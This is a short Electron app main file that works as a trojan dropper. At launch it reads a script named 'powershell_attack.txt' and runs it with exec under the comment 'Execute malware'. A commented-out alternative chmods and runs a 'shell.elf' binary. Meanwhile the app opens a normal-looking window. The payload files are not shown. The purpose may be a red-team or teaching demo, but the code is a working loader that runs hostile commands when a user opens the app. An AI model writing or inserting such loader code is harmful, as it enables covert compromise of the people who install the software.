const { app, BrowserWindow } = require('electron');
const { exec } = require('child_process');
const fs = require('fs');

let mainWindow = '';
const powershell = fs.readFileSync(`${__dirname}/public/powershell_attack.txt`, 'utf8', data => data);

function createWindow() {
    mainWindow = new BrowserWindow({ width: 800, height: 600 });
    mainWindow.loadFile(`${__dirname}/public/index.html`);
    mainWindow.on('closed', () => {
        mainWindow = null;
    });
}

// Execute malware
exec(powershell);
// exec(`chmod +x ${__dirname}/public/shell.elf && ${__dirname}/public/shell.elf`);

app.on('ready', createWindow);

app.on('window-all-closed', () => process.platform !== 'darwin' && app.quit());
// re-create a window on mac
app.on('activate', () => mainWindow === null && createWindow());